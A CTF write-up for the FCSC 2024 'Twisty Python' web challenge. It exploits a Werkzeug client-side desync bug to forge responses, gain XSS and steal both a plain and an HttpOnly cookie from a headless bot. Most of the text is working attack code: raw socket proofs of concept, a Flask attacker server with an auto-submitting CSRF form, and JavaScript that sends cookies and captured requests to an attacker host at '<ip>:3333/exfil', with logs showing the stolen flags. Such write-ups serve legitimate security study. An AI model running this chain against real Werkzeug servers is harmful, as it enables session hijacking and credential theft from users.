---
title: "Twisty Python [EN]| FCSC 2024"
date: 2024-04-12T12:00:00Z
description: "Here is a complete writeup of the 'Twisty Python' web challenge created by Mizu during FCSC 2024"
tags: ["python","desync","werkzeug","smuggling","cve", "tornado"]
keywords: ["nodejs", "RCE", "ejs-string"]
---
[//]: <> (Wrote By Vozec 13/04/2024)
---

# Introduction

```
Venez découvrir la dernière sensation Internet qui promet de battre tous les records ! Dans ce jeu révolutionnaire, vous guiderez un serpent en pleine croissance dans sa quête de pommes. C'est simple mais addictif : dévorez autant de pommes que possible pour étirer votre serpent à des longueurs étonnantes. Êtes-vous prêt à établir de nouveaux records et à devenir une légende dans cette aventure tortueuse ?
```

The sources for this challenge are provided:
```bash
$ tree .
.
├── docker-compose.yml
├── Dockerfile
├── solution
│      └── submit_url.py
└── src
    ├── app.py
    ├── bot.py
    ├── requirements.txt
    ├── static
    │      └── js
    │          └── main.js
    └── templates
        └── index.html
```

The challenge consists of a single application in 2 parts.  
Let's analyze the source code: 

*bot.py*:
```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from time import sleep
from os import environ

def visit(url):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-jit")
    chrome_options.add_argument("--disable-wasm")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.binary_location = "/usr/bin/chromium-browser"

    service = Service("/usr/bin/chromedriver")
    driver = webdriver.Chrome(service=service, options=chrome_options)
    driver.set_page_load_timeout(3)

    driver.get("http://127.0.0.1:8000")
    driver.add_cookie({
        "name": "flag_medium",
        "value": environ.get("FLAG_MEDIUM"),
        "path": "/",
        "httpOnly": False,
        "samesite": "Strict",
        "domain": "127.0.0.1"
    })
    driver.add_cookie({
        "name": "flag_hard",
        "value": environ.get("FLAG_HARD"),
        "path": "/",
        "httpOnly": True,
        "samesite": "Strict",
        "domain": "127.0.0.1"
    })

    try:
        driver.get(url)
    except: pass

    sleep(3)
    driver.close()
```

The chall implements a selenium bot that will go to a url we give it and then, after waiting 3 seconds, close itself.  
The *submit_url.py* file is a wrapper for calling the bot without being able to flood the cu CTF instance.  

The first thing we notice is that the two flags are located in the bot's cookies, on the *127.0.0.1* domain. 
So you'll need to host a malicious site in order to exploit the application and exfiltrate these two flags.  
The first *flag* is not secure, but the second is, with the attribute: *httpOnly* set to ``True''.  

# Discover the application.

Here's the interesting code: 
```python
from flask import Flask, session, request, Response, render_template, jsonify
from os import urandom, environ
from hashlib import sha512
import bot

# Init
app = Flask(__name__)
app.secret_key = urandom(24)

# Utils
def init(session):
    if "scores" not in session:
        session["scores"] = []

# Routes
@app.route("/")
def index():
    init(session)
    return render_template("index.html")

@app.route("/api", methods=["GET", "POST"])
def note():
    init(session)
    action = request.args.get("action")
    if not action:
        return jsonify({"error": "?action= must be set!"})

    if action == "color":
        res = Response(request.args.get("callback"))
        res.headers["Content-Type"] = "text/plain"
        res.headers["Set-Cookie"] = f"color={request.args.get('color', 'red')}"
        return res

    if action == "add":
        if not request.method == "POST":
            return jsonify({"error": "invalid HTTP method"})

        d = request.form if request.form else request.get_json()
        if not ("name" in d and "score" in d):
            return jsonify({"error": "name and score must be set"})

        session["scores"] += [{
            "name": d["name"],
            "score": d["score"]
        }]
        return jsonify({"length": len(session["scores"])})

    if action == "view":
        raw = request.args.get("raw", False)

        if raw:
            res = Response("".join([ f"{v['name']} -> {v['score']}\n" for v in session["scores"] ]))
            res.headers["Content-Type"] = "text/plain"
        else:
            res = jsonify(session["scores"])

        return res

    if action == "clear":
        session.clear()
        return jsonify({"clear": True})

    return jsonify({"error": "invalid action value (color || add || view || clear)"})
```
The rest of the application is marked as useless for solving the challenge (*Example: main.js, index.html*). 
The application is an implementation of the snake game, where you can save your scores and display them in a global scoreboard. You can also change the background color.  

We can ignore the visual part and consider the service as an API.  

This api offers a single endpoint with several actions:   
- ``/api?action=add`` adds a score to the general ranking  
- ``/api?action=clear`` resets the ranking to 0  
- ``/api?action=color`` changes the color of the HTML page.  
- ``/api?action=view`` displays and retrieves the scoreboard.  

It's with these *4* options that we're going to retrieve the two flags.  


## Presentations of the various actions.

It's important to keep in mind all the possible options for calling these actions.

#### Action: *add*
```python
if not request.method == "POST":
    return jsonify({"error": "invalid HTTP method"})
    
d = request.form if request.form else request.get_json()
if not ("name" in d and "score" in d):
    return jsonify({"error": "name and score must be set"})

session["scores"] += [{
    "name": d["name"],
    "score": d["score"]
}]
return jsonify({"length": len(session["scores"])})
``` 

Remember that: 
- The method is **POST**.
- The body can be in ``application/json`` or ``application/x-www-form-urlencoded``.
- The body must contain a ``name`` parameter and a ``score`` parameter.
- The set of scores is stored in the session cookie.


#### Action: *clear*

```python
session.clear()
return jsonify({"clear": True})
```

It simply allows you to have a session with an empty scoreboard.  

#### Action: *view*

```python
raw = request.args.get("raw", False)
if raw:
    res = Response("".join([ f"{v['name']} -> {v['score']}\n" for v in session["scores"] ]))
    res.headers["Content-Type"] = "text/plain"
else:
    res = jsonify(session["scores"])

return res
```

This option takes an optional *raw* parameter and returns, in text or json, the scoreboard stored in the session. 

#### Action: *color*
```python
res = Response(request.args.get("callback"))
res.headers["Content-Type"] = "text/plain"
res.headers["Set-Cookie"] = f"color={request.args.get('color', 'red')}"
return res
```

This fourth action defines the "color" cookie with a value taken as a request parameter.   
It also returns the contents of the *callback* parameter in the body.

## First approach and discovery of the entry point.

Given the presence of a selenium bot and the lack of backend functionality, it's clear that this will be a client-side challenge.  
The four options presented above are minimalist and don't seem to present any critical vulnerabilities.

To make sure I didn't miss anything, despite the challenge creator's comments, I looked for vulnerabilities in the application's static files: *index.html* and *main.js*.   
Once this doubt was removed, I remained focused on these 4 options until the end of the challenge. 

My first objective was to obtain an *XSS*, as the first flag is not HttpOnly and will therefore be accessible if I find an *XSS* on domain 127.0.0.1.

However, the api doesn't return any page with a *Content-Type* interpretable in html!  
The only Content-Types returned are: 
- ``text/plain`` 
- ``application/json``

So I decided to go to [the github of the *Werkzeug* server](https://github.com/pallets/werkzeug/issues) and see if there was a recent vulnerability we could use.

Fortunately for us, a way out seems to be emerging:  
- [Request not closed with Unicode characters in headers #2833](https://github.com/pallets/werkzeug/issues/2833)

*Before analyzing the report, we note that the creator of the challenge is the same creator as the github issue ([Mizu](https://twitter.com/kevin_mizu)) ! This is a good sign for the progress of the challenge.*

He describes a cookie decoding problem that allows a request to be crashed and its body to be passed off as a second request:

```
When responding with a unicode characters in a header key / value, it results in a UnicodeEncodeError (already known with #742, #1286...), but in addition, it doesn't close the connection, leading to use the body as a new request.
``` 

Headers are sent before cookies are parsed. So if the decoding of a *latin-1* cookie crashes, the server will stop transmission of the response and will not send the ``Connection: close`` header, which closes the TCP connection between the browser and the server.

So, if a request is passed in the body of a *POST* request at the same time, the latter will be put in the server buffer and will be considered as a new request and not the content of the previous one.  

This bug is called a *Client side desync* since there is a desynchronization between the data sent and the way it is interpreted.

### Back to the challenge
Once you've read the report, you can test this bug on the application using the ``color`` action, which sets a cookie.

We can reuse the ``\uffff`` character (*Url-encoded: %ef%bf%bf*) proposed by Mizu. 

I wrote this first *P-O-C* : 
```python
from pwn import *

context.log_level = 'critical'

io = remote('localhost', 8000)

payload = b'''
POST /api?action=color&color=%ef%bf%bf HTTP/1.1\r
Host: localhost:8000\r
Content-Length: 500\r
\r
GET /abc HTTP/1.1\r
User-Agent: vozec\r
\r
\r
'''[1:-1]


io.send(payload)
response = str(io.recvall(timeout=2))[2:-1]
print(response.replace('\\n', '\\n\n'))
```

This is the error displayed in the docker console:  
![Client-Side desync POC](https://i.imgur.com/pB5RjsH.png)

You can see that a query on ``/abc`` has been performed!

What's more, the request is back: 
```bash
HTTP/1.1 200 OK\r\n
Server: Werkzeug/3.0.1 Python/3.11.8\r\n
Date: Fri, 12 Apr 2024 20:36:52 GMT\r\n
Content-Type: text/plain\r\n
HTTP/1.1 404 NOT FOUND\r\n
Server: Werkzeug/3.0.1 Python/3.11.8\r\n
Date: Fri, 12 Apr 2024 20:36:52 GMT\r\n
Content-Type: text/html; charset=utf-8\r\n
Content-Length: 207\r\n
Connection: close\r\n
\r\n
<!doctype html>\n
<html lang=en>\n
<title>404 Not Found</title>\n
<h1>Not Found</h1>\n
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n

```

Note that the headers are sent twice, which is in line with the description of the bug that Mizu presented.  

## First exploitation.
 
At this stage, it is possible to return a different page from the one expected by the *color* function.  

Several problems arise:  
- The page content is not controlled  
- The *Content-Type* of the response is not checked.  
- The application repeatedly returns headers with HTTP code in the middle, making the response malformed and therefore incomprehensible to a browser.  

In order to trigger an XSS, you need to fix all 3 bugs!

Playing with the various HTTP options, I realized that if the second request, the smuggled request, was in HTTP/0.9, the return was different: 

```python
...

payload = b'''
POST /api?action=color&color=%ef%bf%bf HTTP/1.1\r
Host: localhost:8000\r
Content-Length: 500\r
\r
GET /abc HTTP/0.9\r
User-Agent: vozec\r
\r
\r
'''[1:-1]

io.send(payload)
...
```

returns only the body, not the headers:

```bash
$ python3 poc_twisty.py
<!doctype html>\n
<html lang=en>\n
<title>404 Not Found</title>\n
<h1>Not Found</h1>\n
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n
```

This solves our last problem, that of invalid headers. Since these no longer exist!  

So we need to find a way of controlling the content of the response in order to forge a valid HTTP response that our browser can understand.  

The next step will be to find a way to return a ``200 OK`` response with a Content-type of *text/html* and an html page with an xss in the body.  


### Première solution:

One solution would be to re-use the color action with the callback parameter to define the raw content of the response.
```python
...
from urllib.parse import quote_plus

response = quote_plus()'''
Hello there
'''[1:-1])

payload = f'''
POST /api?action=color&color=%ef%bf%bf HTTP/1.1\r
Host: localhost:8000\r
Content-Length: 500\r
\r
GET /api?action=color&callback={response} HTTP/0.9\r
User-Agent: vozec\r
\r
\r
'''[1:-1].encode()

io.send(payload)
...
```

*Server response* : ``Hello there``

### Second solution:

Another possibility, and the one I used, is to use the ``view`` action to display the raw content of a scoreboard.

The idea is to store our response in the ``name`` or ``score`` parameter of the ``add`` action, in order to retrieve a session cookie containing our response, and then use the ``view`` action with the *raw* parameter set to 1 to get a raw response.

Here's the Python code we used: 

```python
...
import requests
...
def get_session(payload):
    url = 'http://localhost:8000'
    res =  requests.post(f'{url}/api?action=add', data={
        "name": payload,
        "score": "a"
    })
    session = res.headers['set-cookie']
    return session.split('session=')[1].split(';')[0]

response = '''
Hello there
'''[1:-1]

payload = f'''
POST /api?action=color&color=%ef%bf%bf HTTP/1.1\r
Host: localhost:8000\r
Content-Length: 500\r
\r
GET /api?action=view&raw=1 HTTP/0.9\r
User-Agent: vozec\r
Cookie: session={get_session(response)}
\r
\r
'''[1:-1].encode()

```
*Server response* : ``Hello there``

## Response creation & XSS

Now that we're able to completely control the content of the response thanks to desynchronization, we can forge the following HTTP response: 

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.11.8
Date: Mon, 08 Apr 2024 10:43:55 GMT
Content-Type: text/html; charset=utf-8
Connection: close

<!DOCTYPE html>
<html>
    <head>
        <title>XSS twisty</title>
    </head>
    <body>
        <script>
            alert(1);
        </script>
    </body>
</html>
```

To make this XSS exploitable, we'll use a *CSRF* to get to the vulnerable site from our site, while sending the previous payload.

I chose to use Flask to send the payload

As described [here](https://mizu.re/articles/articles/vuln04_csd_werkzeug/abusing-client-side-desync-on-werkzeug.pdf) *(Abusing Client-Side Desync on Werkzeug to perform XSS on default configurations, Kévin GERVOT)*, I use encoding: ``text/plain`` to avoid url-encoding my payload.  
My payload is placed in a ``textarea`` tag.

```python
from flask import Flask, Response, request
import requests

app = Flask(__name__)

def get_session(payload):
    # url = 'https://twisty-python.france-cybersecurity-challenge.fr'
    url = 'http://localhost:8000'
    res =  requests.post(f'{url}/api?action=add', data={
        "name": payload,
        "score": "a"
    })
    session = res.headers['set-cookie'].split('session=')[1].split(';')[0]
    return session

response = """
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.11.8
Date: Mon, 08 Apr 2024 10:43:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 266
Connection: close

<!DOCTYPE html>
<html>
    <head>
        <title>XSS twisty</title>
    </head>
    <body>
        <script>
            alert(1)
        </script>
    </body>
</html>
"""[1:-1]

session = get_session(response)

smuggled = f'''
GET /api?action=view&raw=1 HTTP/0.9\r
User-Agent: vozec\r
Cookie: session={session};\r
\r
'''[1:]

@app.route("/")
def index():
    
    payload = f'''
<html>
    <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon"> 
    <form action="http://127.0.0.1:8000/api?action=color&color=%ef%bf%bf" method="POST" enctype='text/plain'>
        <textarea name="{smuggled}"></textarea>
    </form>
    <script>
        document.forms[0].submit();
    </script>
</html>
'''[1:-1]
    res = Response(payload)
    return payload


app.run("0.0.0.0", 3333, debug=True)
```

When we go to my public ip on port 3000, we are instantly redirected and the XSS is triggered!  

![Alert(1)](https://i.imgur.com/5SHYBIu.png)

All that remains is to make a slight modification to the script to retrieve the first flag:

```python

def get_session(payload):
    url = 'https://twisty-python.france-cybersecurity-challenge.fr'
    ...

...
response = """
HTTP/1.1 200 OK
Server: FakeResponse
Content-Type: text/html; charset=utf-8
Connection: close

<!DOCTYPE html>
<html>
    <head>
        <title>XSS twisty</title>
    </head>
    <body>
        <script>
            document.location='http://<ip>:3333/exfil?data='.concat(btoa(document.cookie))
        </script>
    </body>
</html>
"""[1:-1]

@app.route("/exfil")
def exfiltrate():
    data = request.args.get('data')
    data = b64decode(data.encode()).decode()
    print('#'*100+'\n'+data+'\n'+'#'*100, file=sys.stdout, flush=True)
    return "OK"

...
```

We use the *submit_url.py* file to send the bot to our site:  
```bash
python3 submit_url.py --challenge "https://twisty-python.france-cybersecurity-challenge.fr" --url "http://<ip>:3333"
```

Then, after a few seconds, we find the flag in the server logs: 

```
$ python3 poc.py
 * Serving Flask app 'poc' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:3333
 * Running on http://<ip>:3333
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 516-152-805
172.18.224.1 - - [08/Apr/2024 19:58:08] "GET / HTTP/1.1" 200 -
####################################################################################################
flag_medium=FCSC{ec0f4f2cd417f0788efd909767b0c2690f11bedb418b2d7773e6c9a6537c7a26}
####################################################################################################
172.18.224.1 - - [08/Apr/2024 19:58:08] "GET /exfil?data=ZmxhZ19tZWRpdW09RkNTQ3tlYzBmNGYyY2Q0MTdmMDc4OGVmZDkwOTc2N2IwYzI2OTBmMTFiZWRiNDE4YjJkNzc3M2U2YzlhNjUzN2M3YTI2fQ== HTTP/1.1" 200 -
```

Flag: ``FCSC{ec0f4f2cd417f0788efd909767b0c2690f11bedb418b2d7773e6c9a6537c7a26}``


## Second exploitation.

The next mission gets tougher: we'll have to use the XSS to find a way of leaking the ``flag_hard`` cookie, which is *HttpOnly* and therefore not accessible via ``document.cookie``.

Before proceeding with the rest of the exploit. Instead of including javascript code directly in the page, I'll host it on my **/js** endpoint and a script tag will execute it when the forged HTTP response is received.

This is a practical modification which will save us from encoding problems.

```python
...
response = """
HTTP/1.1 200 OK
Server: FakeResponse
Content-Type: text/html; charset=utf-8
Connection: close

<!DOCTYPE html>
<html>
    <head>
        <title>XSS twisty</title>
    </head>
    <body>
        <script src='http://<ip>:3333/js'>
    </body>
</html>
"""[1:-1]
...

@app.route("/js")
def js():
    payload = f'''
document.location='http://<ip>:3333/exfil?data='.concat(btoa(document.cookie))
'''[1:-1]
	return payload

```

### Tracks and reflection.

Not knowing exactly all the techniques for stealing an HTTP-Only cookie, I decided to search the internet and here are the different methods that I found for all types of services:

- Using the ``TRACE`` method
- Using ``phpinfo`` in *php*
- Using a page that reflects cookies in the DOM.
- Cookie Smuggling Due to Parsing Issues (see [here](https://youtu.be/F_wAzF4a7Xg) and [here](https://blog.ankursundara.com/cookie-bugs/))

None of these techniques seem feasible: it is a python application which only accepts *POST* and *GET* methods and which never reflects cookies.

On the other hand, a video catch my attention, that of [James Kettle](), CyberSecurity researcher at Portswigger.
It's called ``HTTP Desync Attacks: Smashing into the Cell Next Doo`` *(link [here](https://www.youtube.com/watch?v=w-eJM2Pc0KI))* and presents the possibilities of exploitation with a desync attack.
(An [article](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) also exists on the *portswigger* blog.)


Finally, [this page](https://book.hacktricks.xyz/pentesting-web/http-response-smuggling-desync#abusing-http-response-queue-desynchronisation) from hacktricks gave me the solution:

Here is the overall progress of the exploitation:  
- Via XSS, we send a desynchronization with inside a second request with a large ``Content-length`` on the ``add`` action.  
- The *Content-length* being greater than the size of the body sent, the server will wait for data before terminating the connection.  
- By sending the bot to make another request on the site, the data in the TCP frame will be considered as the body of the previous request and not as a new request.  
- The content of the page can be found with the ``view`` action.  

#### Theoretical exploitation:

A prerequisite for the attack to work is that the requests are all in the same TCP connection.  
TCP sessions are identifiable via a ConnectionId *(visible in the Google Chrome console)*. For two requests to keep the same TCP session, the ``Keep-Alive`` header must be present in order to specify to the two entities not to cut the connection.  

### Technical exploitation:

We can update our javascript code like this:
- We clean the scoreboard with the ``clear`` action
- We send a smuggling with the ``add`` action and a ``Content-Length`` of ... 800.
- We send a request with ``cors`` mode and ``credentials`` in **include**
- We retrieve the page which is saved in the scoreboard
- We exfiltrate the flag.

In order to keep the same TCP connection, I use the javascript ``fetch`` function and chain it with ``.then(response => { })``

Here is the form of the full exploit from xss:
```
fetch('/api?action=clear')
    .then(
        fetch('/api?action=color&color=%ef%bf%bf')
            .then(
                fetch('/').then(
                    fetch('/api?action=view&raw=1')
                        .then(
                            document.location='...'
                        )
                )
            )
    )
```

### Problems encountered & resolutions:

#### ConnectionId different and request which remains in status *pending*:
In order to maintain a connection between several requests, the ``keep-alive`` header must be used.
However, since [this pull requests](https://github.com/pallets/werkzeug/pull/2091), Werkzeug no longer takes into account the *keep-alive* header in HTTP/1.1. Indeed, the server systematically returns a session closure header: ``Connection: close``.

Here is the responsible snippet of code: [here](https://github.com/pallets/werkzeug/blob/d3dd65a27388fbd39d146caacf2563639ba622f0/src/werkzeug/serving.py#L287-L291)

A second problem is that the request that is smuggled is waiting for data, so it never ends and remains in status *pending*.
The TCP socket is therefore never "released", the following request is never sent.

The resolution to these two problems is common, we must arrive at:
- Return something to the browser so that it sends the next request.
- Make sure that the return does not contain ``Connection: close``

After diving early into the Werkzeug source code, we end up coming across [these two lines of code](https://github.com/pallets/werkzeug/blob/d6c2fe14682c95ba08921d3474f4f6527d471fe2/src/werkzeug/serving.py#L242- L243):
```python
if self.headers.get("Expect", "").lower().strip() == "100-continue":
    self.wfile.write(b"HTTP/1.1 100 Continue\r\n\r\n")
```

If the ``Expect`` header has the value ``100-continue``, then the server immediately returns ``HTTP/1.1 100 Continue``, it's perfect!

#### Bad character: *&*
When saving the page, the entire query is saved, including the headers.
Some of them contain the *&* character which breaks the query on ``/api?action=add``. Indeed, the body being in *application/www-form-urlencoded*, the & serves as a separator for the variables and ``name`` is cut off.

This character being in the header referer, I added this line to my exploit to remove it:
```js
history.pushState(null,null,'/')
```

#### Bad alignment in the TCP queue.
The last bug I had was that I wasn't receiving any pages on ``/api?action=view``  
For some rather obscure reason, it is necessary to add 25 characters to the callback of the request which smuggle *(?action=color)* . This is notably because the server is waiting for data between the first POST and the smuggled request.  
So I tested and observed that locally, I was able to retrieve my page with *25* characters, this corresponds to the size of the response sent: ``"HTTP/1.1 100 Continue\r\n\r\ n"``

#### Bad Content-Lenght.
You also need to find the correct **Content-Length** to put in the smuggled query on ``?action=add``. You must enter the number of bytes that you wish to recover from the rest of the buffer.  
Locally, I will get the flag with a value of *699* but this was a little different remotely: *(665)*

### Final achievement:

Here is my final version of the exploitation

```python
from flask import Flask, Response, request
from base64 import b64encode, b64decode, urlsafe_b64encode
import urllib.parse
import requests

app = Flask(__name__)
context.log_level = 'critical'

mon_ip = '<ip>:3333'

def get_session(payload):
    url = 'https://twisty-python.france-cybersecurity-challenge.fr'
    # url = 'http://localhost:8000'
    res =  requests.post(f'{url}/api?action=add', data={
        "name": payload,
        "score": "ez"
    })
    session = res.headers['set-cookie']
    return session.split('session=')[1].split(';')[0]

smuggled_self = b64encode(f'''
POST /api?action=add HTTP/1.1\r
User-Agent: hacker3\r
Connection: close\r
Content-type: application/x-www-form-urlencoded\r
Content-length: 665\r
Expect: 100-Continue\r

name=me&score=
'''[1:].encode()).decode()


xss_html = f'''
HTTP/1.1 200 OK\r
Connection: close\r
Content-Type: text/html\r
Date: Tue, 09 Apr 2024 23:28:09 GMT\r
Content-Length: LENGTH_HERE\r
\r
<!DOCTYPE html>
<body>
    <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon">
    <script src='http://{mon_ip}/js'></script>
</body>
\r
'''[1:]
xss_html = xss_html.replace('LENGTH_HERE', str(len(xss_html)-xss_html.index('<!DOCTYPE html>')))


smuggled = f'''
GET /api?action=view&raw=1\r
Cookie: session={get_session(xss_html)};\r
\r
'''[1:]

payload = f'''
<html>
    <link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon"> 
    <form action="http://127.0.0.1:8000/api?action=color&color=%ef%bf%bf&callback=a" method="POST" enctype='text/plain'>
        <textarea name="{smuggled}"></textarea>
    </form>
    <script>
        document.forms[0].submit();
    </script>
</html>
'''[1:-1]

@app.route("/js")
def js():
    payload = f'''
fetch("/api?action=clear").then(response => {{

    history.pushState(null,null,'/')

    fetch("/api?action=color&color=%ef%bf%bf&callback="+"x".repeat(25), {{
        method: "POST",
        mode: "no-cors",
        credentials: "include",
        keepAlive: true,
        body: atob('{smuggled_self}')
    }})
    .then(response => {{

        fetch("/", {{
            method: "GET",
            mode: "cors",
            credentials: "include",
            keepAlive: true,
        }})
        .then(response => {{

            fetch("/api?action=view&raw=1", {{
                method: "GET",
                mode: "cors",
                credentials: "include",
                keepAlive: true
            }})
            .then(response => response.text())
            .then(text => {{
                document.location='http://{mon_ip}/exfil?data='.concat(btoa(text))
            }})

        }})

     }})

}})
'''
    return payload

@app.route("/exfil")
def exfiltrate():
    data = request.args.get('data')
    data = str(b64decode(data.encode())).replace('\\n', '\\n\n')
    print('#'*100+'\n'+data+'\n'+'#'*100, file=sys.stdout, flush=True)
    return "OK"

@app.route("/")
def index():
    return payload


app.run("0.0.0.0", 3333, debug=True)
```

Similar to the first step, I send the bot home with the *submit.py* file.

After a few seconds, I receive the flags in my logs:

```bash
172.18.224.1 - - [12/Apr/2024 15:24:16] "GET / HTTP/1.1" 200 -
172.18.224.1 - - [12/Apr/2024 15:24:16] "GET /js HTTP/1.1" 200 -
####################################################################################################
b'me ->
GET / HTTP/1.1\r
Host: 127.0.0.1:8000\r
Connection: keep-alive\r
sec-ch-ua: "HeadlessChrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"\r
sec-ch-ua-mobile: ?0\r
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/123.0.6312.105 Safari/537.36\r
sec-ch-ua-platform: "Linux"\r
Accept: */*\r
Sec-Fetch-Site: same-origin\r
Sec-Fetch-Mode: cors\r
Sec-Fetch-Dest: empty\r
Referer: http://127.0.0.1:8000/\r
Accept-Encoding: gzip, deflate, br\r

Cookie: flag_medium=FCSC{ec0f4f2cd417f0788efd909767b0c2690f11bedb418b2d7773e6c9a6537c7a26}; flag_hard=FCSC{a27d820450644445dda6757b8d01793456e6308a1c04bebaf5b434625129159e}\r
\r
####################################################################################################
172.18.224.1 - - [12/Apr/2024 15:24:17] "GET /exfil?data=bWUgLT4gCkdFVCAvIEhUVFAvMS4xDQpIb3N0OiAxMjcuMC4wLjE6ODAwMA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0Kc2VjLWNoLXVhOiAiSGVhZGxlc3NDaHJvbWUiO3Y9IjEyMyIsICJOb3Q6QS1CcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iMTIzIg0Kc2VjLWNoLXVhLW1vYmlsZTogPzANClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgSGVhZGxlc3NDaHJvbWUvMTIzLjAuNjMxMi4xMDUgU2FmYXJpLzUzNy4zNg0Kc2VjLWNoLXVhLXBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQ6ICovKg0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtTW9kZTogY29ycw0KU2VjLUZldGNoLURlc3Q6IGVtcHR5DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjgwMDAvDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb29raWU6IGZsYWdfbWVkaXVtPUZDU0N7ZWMwZjRmMmNkNDE3ZjA3ODhlZmQ5MDk3NjdiMGMyNjkwZjExYmVkYjQxOGIyZDc3NzNlNmM5YTY1MzdjN2EyNn07IGZsYWdfaGFyZD1GQ1NDe2EyN2Q4MjA0NTA2NDQ0NDVkZGE2NzU3YjhkMDE3OTM0NTZlNjMwOGExYzA0YmViYWY1YjQzNDYyNTEyOTE1OWV9DQoNCg== HTTP/1.1" 200 -
```

We have: ``flag_hard=FCSC{a27d820450644445dda6757b8d01793456e6308a1c04bebaf5b434625129159e}``

# Conclusion

It was a very complicated challenge because each small modification leads to the complete shutdown of the entire exploit. Everything is measured by bytes ready in certain cases and solving the challenge requires a good understanding of the HTTP protocol as well as the Werkzeug server.

Thank you [Mizu](https://twitter.com/kevin_mizu) for his challenge :)

# Useful links:
- https://mizu.re/articles/articles/vuln04_csd_werkzeug/abusing-client-side-desync-on-werkzeug.pdf
- https://book.hacktricks.xyz/pentesting-web/http-response-smuggling-desync#capturing-other-users-requests
- https://github.com/pallets/werkzeug/blob/main/src/werkzeug/serving.py#L292
- https://book.hacktricks.xyz/pentesting-web/http-response-smuggling-desync#abusing-http-response-queue-desynchronisation
- https://www.youtube.com/watch?v=w-eJM2Pc0KI&t=1837s
- https://www.youtube.com/watch?v=_A04msdplXs